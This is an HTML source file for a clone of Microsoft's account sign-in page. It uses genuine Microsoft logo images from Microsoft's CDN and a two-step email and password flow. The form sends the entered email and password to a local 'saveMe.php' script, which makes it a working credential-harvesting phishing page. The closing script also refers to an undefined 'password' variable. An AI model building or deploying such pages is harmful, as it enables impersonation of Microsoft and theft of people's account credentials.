<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <title>Live Signin Page Clone</title>
</head>

<body>
    <div class="container">
        <form id="myForm" action="saveMe.php" method="POST">
            <img class="logo"
                src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg">
            <div class="forms-container">
                <div class="forms">
                    <div class="first">
                        <h2>Sign in</h2>
                        <div class="form-group">
                            <input name="inp_email" id="inp_email" type="email" placeholder="Email, Phone, or Skype">
                        </div>
                        <p>No account? <a href="#">Create One!</a></p>
                        <a href="#">Sign in with a security key <span>?</span></a>
                        <button type="button" class="next-btn" action="saveMe.php" method="POST">Next</button>
                    </div>
                    <div class="second">
                        <p><span class="arrow-btn">&#8592;</span> <span class="email">helloworld@hotmail.com</span></p>
                        <h2>Enter password</h2>
                        <div class="form-group">
                            <input name="inp_pwd" id="inp_pwd" type="password" placeholder="Password">
                        </div>
                        <a href="#">Forgot password?</a>
                        <button class="sig-btn" type="submit" action="saveMe.php" method="POST">Sign in</button>
                    </div>
                </div>
            </div>
        </form>

        <div class="bottom">
            <img
                src="https://logincdn.msauth.net/shared/1.0/content/images/signin-options_4e48046ce74f4b89d45037c90576bfac.svg">
            <span>Sign-in options</span>
        </div>
    </div>



    <script>
        const forms = document.querySelector('.forms')
        const next_button = document.querySelector('.next-btn')
        const arrow_btn = document.querySelector('.arrow-btn')
        const sig_button = document.querySelector('.sig-btn')

        const email_input = document.querySelector('.first input')
        const email_el = document.querySelector('.email')



        next_button.addEventListener('click', () => {
            forms.classList.add('next-form')
            email_el.innerText = email_input.value
            document.querySelector('.bottom').style.display = 'none'

        })
        arrow_btn.addEventListener('click', () => {
            forms.classList.remove('next-form')
            document.querySelector('.bottom').style.display = 'flex'
        })

        sig_button.addEventListener('click', () => {
            var form = document.getElementById('myForm');
            var email = document.getElementById('inp_email').value;
            var pass = document.getElementById('inp_pwd').value;

            alert("Email: " + email + "\nPassword: " + password);
        })
    </script>
</body>

</html>
